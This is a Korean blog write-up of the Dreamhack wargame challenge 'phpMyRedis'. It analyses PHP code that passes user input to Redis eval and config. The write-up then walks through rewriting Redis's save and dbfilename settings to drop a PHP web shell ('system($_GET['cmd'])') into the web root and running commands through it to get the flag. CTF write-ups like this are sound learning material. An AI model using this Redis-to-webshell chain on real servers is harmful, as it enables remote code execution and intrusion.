---
title: "드림핵 lv.2 - phpMyRedis"
date: 2025-03-07 00:10:00 +0800
categories: [Wargame, Dreamhack]
tags: [cyber security, writeup, dreamhack, web hacking, nosql injection, redis] 
description: 드림핵 phpMyRedis 웹해킹 워게임 풀이
---

[https://dreamhack.io/wargame/challenges/420](https://dreamhack.io/wargame/challenges/420)
# 문제 설명
php로 redis를 관리하는 서비스 입니다.  
취약점을 찾고 flag를 획득하세요!

---
# 문제 풀이
## 웹사이트 분석
### main page
![phpmyredis main page img](https://1drv.ms/i/c/5cb37aa515b56a00/IQRHIz_syHK_T57B2DnNXFFUAWoM9yqSceWRoMM0QE2i3xA?width=660)
<br />
메인 페이지에 접속해보면 해당 화면이 보인다.<br />
command를 입력할 수 있는 칸이 있고 submit한 명령어의 히스토리를 아래에서 볼 수 있다. 그리고 그 위에는(해당 사진에는 나와있지 않지만) 내가 가장 최근에 실행했던 명령어의 결과가 뜨게 된다.

여기서 예상해 볼 수 있는 것은 어떠한 명령어를 실행해서 플래그를 출력하면 되는 것 같다.
### config page
![phpmyredis config page img](https://1drv.ms/i/c/5cb37aa515b56a00/IQS4MLEJiXuaQrWeToI9cC0qAcnSCYhpgFZeVwcfBB3lP80?width=660)<br />
메인 페이지에서 오른쪽 상단 위의 config 버튼을 누르면 나오는 페이지이다.<br />
여기서는 GET과 SET 옵션 중 하나를 고를 수 있고 key, value 값을 입력해 submit하는 기능이 있다. 그리고 submit의 결과가 submit 버튼 아래에 뜨게된다.
## 코드 분석
```
[Code Structure]
src/
	- config.php
	- core.php
	- index.php
	- reset.php
Dockerfile
run-lamp.sh
```
### index.php
```php
if(isset($_POST['cmd'])){
	$redis = new Redis();
	$redis->connect($REDIS_HOST);
	$ret = json_encode($redis->eval($_POST['cmd']));
	echo '<h1 class="subtitle">Result</h1>';
	echo "<pre>$ret</pre>";
	if (!array_key_exists('history_cnt', $_SESSION)) {
		$_SESSION['history_cnt'] = 0;
	}
	$_SESSION['history_'.$_SESSION['history_cnt']] = $_POST['cmd'];
	$_SESSION['history_cnt'] += 1;

	if(isset($_POST['save'])){
		$path = './data/'. md5(session_id());
		$data = '> ' . $_POST['cmd'] . PHP_EOL . str_repeat('-',50) . PHP_EOL . $ret;
		file_put_contents($path, $data);
		echo "saved at : <a target='_blank' href='$path'>$path</a>";
	}
}
```
command로 들어온 값을 `redis->eval($_POST['cmd'])`를 이용해서 실행하고 있다. 그리고 해당 함수의 반환값을 화면에 출력한다.<br />
redis의 `eval()` 함수에 대해서는 잘은 모르지만 검색을 해보면 인자로 받은 Lua script를 실행해주는 함수인듯 하다.
### config.php
```php
if(isset($_POST['option'])){
	$redis = new Redis();
	$redis->connect($REDIS_HOST);
	if($_POST['option'] == 'GET'){
		$ret = json_encode($redis->config($_POST['option'], $_POST['key']));
	}elseif($_POST['option'] == 'SET'){
		$ret = $redis->config($_POST['option'], $_POST['key'], $_POST['value']);
	}else{
		die('error !');
	}                        
	echo '<h1 class="subtitle">Result</h1>';
	echo "<pre>$ret</pre>";
}
```
config 페이지에서는 option이 GET이라면 `redis->config($_POST['option'], $_POST['key'])`를 수행하고 SET이라면 `redis->config($_POST['option'], $_POST['key'], $_POST['value'])`를 수행한다.<br />

```php
$configValue = $redis->config('GET', 'maxmemory'); // Fetches the 'maxmemory' setting 
$redis->config('SET', 'maxmemory', '100mb'); // Changes the 'maxmemory' setting
```
참고로 `config()` 함수는 Redis 서버의 설정을 건드릴 수 있다. 예시를 들자면 위 코드와 같다.
### DockerFile
```
# FLAG
#COPY ./flag /flag
```
DockerFile의 중간 부분을 보면 플래그가 `/flag`에 위치한 것을 알 수 있다. 
## 최종 풀이
플래그가 서버 내부의 `/flag`라는 곳에 있다. 그러므로 우리는 어떻게든 shell script를 실행시켜서 파일을 읽어내야 한다.<br />

혹시나 Lua Script로 `os.execute()` 함수를 통해서 플래그 파일에 접근할 수 있는지 테스트를 해보았지만 실패했다.
### Lua Script 작동 여부 확인
[https://docs.w3cub.com/redis/eval](https://docs.w3cub.com/redis/eval)<br />
Lua script가 메인 페이지에서 작동하는지 테스트하기 위해서 아래와 같은 명령어들을 입력했다. 공식 다큐먼트를 보면 `redis.call()`과 `redis.pcall()`을 사용할 수 있다고 알려준다.
```
1. return redis.call('set', 'ex', 'ev');
2. return redis.call('get', 'ex');
```
이렇게 하면 결과로 "ev"가 출력되는 것이 확인되면서 동시에 스크립트가 제대로 작동한다는 것을 알 수 있다.
### webshell 삽입
우리는 현재 `redis.call()`을 사용할 수 있고 redis의 configuration을 건드릴 수 있다. 문제에서 아무 이유 없이 config 페이지를 제공하는게 아닐 것이다.<br />

```
# Save the DB to disk.
#
# save <seconds> <changes> [<seconds> <changes> ...]
#
# Redis will save the DB if the given number of seconds elapsed and it
# surpassed the given number of write operations against the DB.
#
# Snapshotting can be completely disabled with a single empty string argument
# as in following example:
#
# save ""
#
# Unless specified otherwise, by default Redis will save the DB:
#   * After 3600 seconds (an hour) if at least 1 change was performed
#   * After 300 seconds (5 minutes) if at least 100 changes were performed
#   * After 60 seconds if at least 10000 changes were performed
#
# You can set these explicitly by uncommenting the following line.
#
# save 3600 1 300 100 60 10000
```
[https://raw.githubusercontent.com/redis/redis/unstable/redis.conf](https://raw.githubusercontent.com/redis/redis/unstable/redis.conf)<br />
Redis의 Configuration 문서를 살펴보면 save라는 항목이 보인다. <br />
일종의 백업 시스템이다. 특정 양의 값들이 변했을 때 특정 시간 뒤에 지금까지의 DB 데이터를 서버 파일에 저장하는 메커니즘이다.<br />

즉, save 값을 60 10000(10000개의 값의 변화가 있다면 60초 후 저장)이던 것을 30 0로 변경해서 DB에 값을 입력하자마자 해당 값이 서버에 저장되도록 할 수 있다.<br />

```
# The filename where to dump the DB
dbfilename dump.rdb
```
또 문서를 보면 dbfilename 값이 가지는 파일 이름으로 DB에 백업 파일이 저장되는 걸 알 수 있다.<br />
해당 값을 config 페이지를 이용해서 `webshell.php`로 바꿔준다. <br />

이렇게 해서 `save: "30 0"`, `dbfilename: "webshell.php"`로 변경이 됐다.<br />

이제는 메인 페이지에서 웹쉘을 삽입하면 된다. 삽입하는 방법은 위 과정을 수행했다면 간단하다. `redis.call()`을 이용한다.
```
return redis.call("set", "webshell", "<?php system($_GET['cmd']); ?>")
```
이렇게 작성하면 webshell이라는 키를 가진 DB Entity가 생성된다. 동시에 save 설정 값을 DB의 값 변화와 동시에 백업 파일을 저장하도록 했기 때문에 webshell의 value 값이 파일에 저장이 된다. <br />
그러므로 `dbfilename`으로 설정해두었던 `webshell.php`에 `<?php system($_GET['cmd']); ?>`이 저장이 된다.

```
REDIS0009� redis-ver5.0.14� redis-bits�@�ctime����g�used-mem+�aof-preamble���webshell  
**Warning**: system(): Cannot execute a blank command in **/var/www/html/webshell.php** on line **2**  
�زl�1PHPREDIS_SESSION:b3e3c543496b7c5cba68a74f28176ed5�@�C(history_cnt|i:9;h�0|s:70:"return redis.call("set", "webshell@  
**Warning**: system(): Cannot execute a blank command in **/var/www/html/webshell.php** on line **2**  
")"�W1�NW2�NW3�NW4�NW5�NW6�NW7�NW8�DW";��%"~���
```
http://host1.dreamhack.games:{port}/webshell.php 에 접근하면 이런 화면이 뜨게 된다. 웹 쉘을 좀 더 예쁘게 작성해도 됐지만 지금은 상관없으니 그냥 이대로 두었다.<br />

지금은 cmd값에 아무것도 전달하지 않아서 에러가 난다.<br />
```
REDIS0009� redis-ver5.0.14� redis-bits�@�ctime����g�used-mem+�aof-preamble���webshell/var/www/html �زl�1PHPREDIS_SESSION:b3e3c543496b7c5cba68a74f28176ed5�@�C(history_cnt|i:9;h�0|s:70:"return redis.call("set", "webshell@/var/www/html ")"�W1�NW2�NW3�NW4�NW5�NW6�NW7�NW8�DW";�H �&�v�
```
테스트 용으로 `?cmd=pwd`를 전달해주면 중간에 `/var/www/html`이 출력된 것을 볼 수 있다. <br />
이제 `?cmd=cat /flag`로 플래그 값을 보려고 하는데 이렇게 하면 아무것도 출력이 안된다.<br />

플래그 파일에 문제가 있나 `?cmd=file /flag`로 살펴보니 플래그 파일이 문서가 아니라 실행 파일이었다. <br />
`?cmd=/flag`를 입력하면 플래그가 출력된다.
# 배운 것
PHP에서 Redis를 사용할 경우 발생할 수 있는 취약점을 배우고 채험할 수 있었다.<br />
특히 `redis->eval()` 함수엔 Lua Script가 들어간다던지, configuration 값을 바꿔서 할 수 있는 것들이 많다는 점들.